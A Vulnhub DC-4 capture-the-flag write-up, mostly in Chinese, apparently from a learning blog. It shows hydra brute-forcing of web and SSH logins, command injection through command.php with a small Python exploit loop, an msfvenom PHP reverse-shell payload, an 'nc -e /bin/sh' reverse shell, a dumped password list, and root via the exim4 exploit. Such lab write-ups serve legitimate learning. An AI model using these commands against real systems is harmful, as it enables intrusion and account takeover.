---
title: DC4 walk-through/learning notes
date: 2021-01-17 +0800
categories: [pentest-learning,Vulnhub]
tags: ctf
---

# discover

## ip
直接使用arp-scan扫描得出结果

192.168.31.241  00:0c:29:2d:55:4f       VMware, Inc.

## services

rustscan 
``` bash
rustscan 192.168.31.241 --ulimit 5000 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust

<<<<more infomation missing when paste note in vim!!!!!!!!!!>>>>
```

端口|服务
---|---
22|ssh 
80|ngnix-1.15.10


## rest infomation

### 目录枚举

我经历了一些目录爆破和密码爆破 并且此处使用了hydra

目录信息如下

|name
|---
|login.php
|logoff.php
|index.php
|images
|css
|command.php

剩下主要是一些失败的尝试

### 探寻了CVE 通用漏洞利用

但是searchsploit 在ngnix和版本的配合下 尽管有找到一些利用和漏洞 但是实际跑起来都是 不可行的方案

搜索了exploit-db也无任何发现

于是成功排除cve可能

ssh连接也看了一眼 版本是不可利用版本

### sql注入可能性排除

首先并不清楚是不是有sql存在

然后通过sqlmap和自己的手动注入试了一下

并不可行

### 失败的密码爆破

然后是失败的密码爆破

run on hydra 然后我找到了很多错误的结果

使用指令

``` bash
hydra -l admin -P /usr/share/wordlist/rockyou.txt 192.168.31.214 http-post-form "/login.php:username=^USER^&password=^PASS^&login=command:login fail"

```
结果便是

```
1 of 1 target successfully completed, 16 valid passwords found
```

>整理出来一个整齐的格式可以使用指令cut 以及 sed （去空格 print 第几位单词） 
>``` bash
>sed 's/ //g'
>```
>
>or
>
>``` bash
>cut -d " " -f 2
>```
>这里展示的是去掉行首空格的办法

看到那12个结果不免有些惊慌失措

通过｜ 的命令拼接以及一些处理（使用cut sed） 便可以拿出一个可能的密码列表

we can burp for it

很可笑的是 all fail ..

如果有任何人知道我为什么密码爆破出错的话可以在评论区告诉我

# 攻击 寻找攻击方向

## 突破点 entry point

在浏览目录的时候

由于每一次的浏览器浏览都会导致302重定向到index让你login

于是 在curl和burp的努力下

我发现了一些被我忽略的信息

```
$ curl "http://192.168.31.241//command.php"       
<html>
<head>
<title>System Tools - Command</title>
<link rel="stylesheet" href="css/styles.css">
</head>

<body>
        <div class="container">
           
Disk Usage     <div class="inner">


                        <form method="post" action="command.php">
                                <strong>Run Command:</strong><br>
                                <input type="radio" name="radio" value="ls -l" checked="checked">List Files<br />
                                <input type="radio" name="radio" value="du -h">Disk Usage<br />
                                <input type="radio" name="radio" value="df -h">Disk Free<br />
                                <p>
                                <input type="submit" name="submit" value="Run">
                        </form>

                        You need to be logged in to use this system.<p><a href='index.php'>Click to Log In Again</a>
                </div>
        </div>
</body>
</html>                        
```

这里很明显传递了一个radio的参数可以进行远程命令执行

但是无论如何都需要登陆才能返回

一开始的我是猜测是不是可能会存在一种情况

即： 我的指令是真实被执行的 但是只是我看不到返回的信息就被系统清除掉了

经过一系列尝试 发现并没有这种可能 

也就是利用nc指令来做到 连接我的端口 输出命令执行成功的信息这样

## 成功的密码爆破


force me to login?

and i run my burp pro and

it works

info|detail
---|---
wordlist|rockyou.txt
username|admin
password|happy

copy the url as curl in web broswer

我们可以看到

``` bash
$ curl 'http://192.168.31.241/command.php' \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
-H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' \
--compressed \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Origin: http://192.168.31.241' -H 'Connection: keep-alive' \
-H 'Referer: http://192.168.31.241/command.php' \
-H 'Cookie: PHPSESSID=alidntd129mheml2nuvpq649n5' \
-H 'Upgrade-Insecure-Requests: 1' \
--data-raw 'radio=ls+/&submit=Run'
```
## exp
edit 这个 radio 变量就可以进行远程控制

and i run python to simple exp it 

（直接调用shell了就不用requests库了）

``` python
import os

while 1:
    youCommand=input("cmd=")
    if youCommand == "end":
        break
    response=os.popen("curl 'http://192.168.31.241/command.php' \
            -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \
            -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
            -H 'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' \
            --compressed -H 'Content-Type: application/x-www-form-urlencoded'\
            -H 'Origin: http://192.168.31.241' -H 'Connection: keep-alive' \
            -H 'Referer: http://192.168.31.241/command.php' \
            -H 'Cookie: PHPSESSID=alidntd129mheml2nuvpq649n5' \
            -H 'Upgrade-Insecure-Requests: 1' \
            --data-raw 'radio=%s&submit=Run'" %(youCommand)).read()
    print( response.split("<pre>")[1].split("</pre>")[0] )


```

运行效果如下：

``` bash
python <exp>.py
cmd=cat /home/jim/test.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   957    0   919  100    38   149k   6333 --:--:-- --:--:-- --:--:--  155k
#!/bin/bash
for i in {1..5}
do
 sleep 1
 echo "Learn bash they said."
 sleep 1
 echo "Bash is good they said."
done
 echo "But I'd rather bash my head against a brick wall."


 try to send shell.php file

 ```

进行一波探测和弹出shell的尝试

非常熟练的生成shell 尝试传递

 ``` bash
┌──(kali㉿Esonhugh)-[~]
└─$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.141 LPORT=4444 -f raw -o ./shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1115 bytes
Saved as: ./shell.php

┌──(kali㉿Esonhugh)-[~]
└─$ python -m http.server
python3 is default python version in python command which created by alias

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.31.241 - - [16/Jan/2021 18:31:34] "GET /shell.php HTTP/1.1" 200 -


 ```

To be continue .

## Shell return 

use the command.php with 

nc -e /bin/sh <ip> port 

and search the files  other people 
```
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
monkey
123321
dragon
654321
666666
123
myspace1
a123456
121212
1qaz2wsx
123qwe
123abc
tinkle
target123
gwerty
1g2w3e4r
gwerty123
zag12wsx
7777777
qwerty1
1q2w3e4r
987654321
222222
qwe123
qwerty123
zxcvbnm
555555
112233
fuckyou
asdfghjkl
12345a
123123123
1q2w3e
qazwsx
loveme1
juventus
jennifer1
!~!1
bubbles
samuel
fuckoff
lovers
cheese1
0123456
123asd
999999999
madison
elizabeth1
music
buster1
lauren
david1
tigger1
123qweasd
taylor1
carlos
tinkerbell
samantha1
Sojdlg123aljg
joshua1
poop
stella
myspace123
asdasd5
freedom1
whatever1
xxxxxx
00000
valentina
a1b2c3
741852963
austin
monica
qaz123
lovely1
music1
harley1
family1
spongebob1
steven
nirvana
1234abcd
hellokitty
thomas1
cooper
520520
muffin
christian1
love13
fucku2
arsenal1
lucky7
diablo
apples
george1
babyboy1
crystal
1122334455
player1
aa123456
vfhbyf
forever1
Password
winston
chivas1
sexy
hockey1
1a2b3c4d
pussy
playboy1
stalker
cherry
tweety
toyota
creative
gemini
pretty1
maverick
brittany1
nathan1
letmein1
cameron1
secret1
google1
heaven
martina
murphy
spongebob
uQA9Ebw445
fernando
pretty
startfinding
softball
dolphin1
fuckme
test123
qwerty1234
kobe24
alejandro
adrian
september
aaaaaa1
bubba1
isabella
abc123456
password3
jason1
abcdefg123
loveyou1
shannon
100200
manuel
leonardo
molly1
flowers
123456z
007007
password.
321321
miguel
samsung1
sergey
sweet1
abc1234
windows
qwert123
vfrcbv
poohbear
d123456
school1
badboy
951753
123456c
111
steven1
snoopy1
garfield
YAgjecc826
compaq
candy1
sarah1
qwerty123456
123456l
eminem1
141414
789789
maria
steelers
iloveme1
morgan1
winner
boomer
lolita
nastya
alexis1
carmen
angelo
nicholas1
portugal
precious
jackass1
jonathan1
yfnfif
bitch
tiffany
rabbit
rainbow1
angel123
popcorn
barbara
brandy
starwars1
barney
natalia
jibril04
hiphop
tiffany1
shorty
poohbear1
simone
albert
marlboro
hardcore
cowboys
sydney
alex
scorpio
1234512345
q12345
qq123456
onelove
bond007
abcdefg1
eagles
crystal1
azertyuiop
winter
sexy12
angelina
james
svetlana
fatima
123456k
icecream
popcorn1

```


and also we get this 

```
ls -al && pwd
total 32
drwxr-xr-x 3 jim  jim  4096 Apr  7  2019 .
drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
-rw------- 1 jim  jim   528 Apr  6  2019 mbox
-rwsrwxrwx 1 jim  jim    39 Jan 25 14:20 test.sh
/home/jim

```
we can use the suid  to get root .

ok now we just need login as the jim 

and edit the sh file to go root and got my flag 

nice!!!

## horizontal crossing the account(su the user) 


so we can do hydra and crack password in backupfiles
``` bash 
─$ hydra -l jim -P ./passwords.txt ssh://192.168.31.241                                   130 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * * * ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-24 23:32:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task
[DATA] attacking ssh://192.168.31.241:22/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 77 to do in 00:01h, 16 active
[22][ssh] host: 192.168.31.241   login: jim   password: jibril04
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-24 23:33:43
```


```
└─$ ssh jim@192.168.31.119
The authenticity of host '192.168.31.119 (192.168.31.119)' can't be established.
ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.31.119' (ECDSA) to the list of known hosts.
jim@192.168.31.119's password: 
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
jim@dc-4:~$ ls
backups  mbox  test.sh
jim@dc-4:~$ ls -al
total 32
drwxr-xr-x 3 jim  jim  4096 Apr  7  2019 .
drwxr-xr-x 5 root root 4096 Apr  7  2019 ..
drwxr-xr-x 2 jim  jim  4096 Apr  7  2019 backups
-rw-r--r-- 1 jim  jim   220 Apr  6  2019 .bash_logout
-rw-r--r-- 1 jim  jim  3526 Apr  6  2019 .bashrc
-rw------- 1 jim  jim   528 Apr  6  2019 mbox
-rw-r--r-- 1 jim  jim   675 Apr  6  2019 .profile
-rwsrwxrwx 1 jim  jim   174 Apr  6  2019 test.sh
jim@dc-4:~$ 


```

edit the shell file !!

# ROOT(pwn this machine)

there has  a question how to edit the file with suid without the suid lose

but fail?
i cam't root by this.

cat the mbox we can see the mail says

```
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
        (envelope-from <root@dc-4>)
        id 1hCiQe-0000gc-EC
        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.

```

emm my be the suid shell script is the rabbit hole for the SUID ?

emmmmmmmmmmmmm....

seen this mail i got my idea about how to exp it.

and i remember the exim 4 maybe got the dirty Linux LPE vuln

run find command 

```
jim@dc-4:~$ find / -type f -perm -u=s 2>/dev/zero
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
/bin/ping
/home/jim/test.sh

```
yes the exim4


cp the payload 46996 on exploit-db.com  to the machine

```
jim@dc-4:~$ ./exp.sh -m netcat

raptor_exim_wiz - "The Return of the WIZard" LPE exploit
Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>

Delivering netcat payload...
220 dc-4 ESMTP Exim 4.89 Mon, 25 Jan 2021 16:34:02 +1000
250 dc-4 Hello localhost [::1]
250 OK
250 Accepted
354 Enter message, ending with "." on a line by itself
250 OK id=1l3vRq-0000HP-OZ
221 dc-4 closing connection

Waiting 5 seconds...
localhost [127.0.0.1] 31337 (?) open
ls
db
gnutls-params-2048
input
msglog
whoami
root
cd /root
ls
flag.txt
cat flag.txt



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.


```

SUCCESS!!!!!
